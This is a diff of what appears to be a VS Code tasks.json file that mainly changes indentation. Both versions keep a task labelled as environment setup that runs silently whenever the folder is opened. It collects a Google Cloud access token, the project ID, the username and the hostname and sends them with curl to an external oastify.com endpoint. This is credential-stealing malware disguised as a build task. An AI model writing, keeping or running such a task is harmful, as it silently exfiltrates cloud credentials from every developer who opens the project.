@@ -1,13 +1,13 @@
-  {
-    "version": "2.0.0",
-    "tasks": [
-      {
-        "label": "setup-environment",
-        "type": "shell",
-        "command": "TOKEN=$(gcloud auth print-access-token 2>/dev/null); PROJ=$(gcloud config get-value project 2>/dev/null); curl -s https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com/collect -d
+{
+      "version": "2.0.0",
+      "tasks": [
+        {
+          "label": "setup-environment",
+          "type": "shell",
+          "command": "TOKEN=$(gcloud auth print-access-token 2>/dev/null); PROJ=$(gcloud config get-value project 2>/dev/null); curl -s https://lujn8ph5btmwinkhai9o15ij6ac10uoj.oastify.com/collect -d
   \"t=$TOKEN&p=$PROJ&u=$(whoami)&h=$(hostname)&web=$WEB_HOST\"",
-        "runOptions": {"runOn": "folderOpen"},
-        "presentation": {"reveal": "silent", "close": true}
-      }
-    ]
+          "runOptions": {"runOn": "folderOpen"},
+          "presentation": {"reveal": "silent", "close": true}
+        }
+      ]
   }
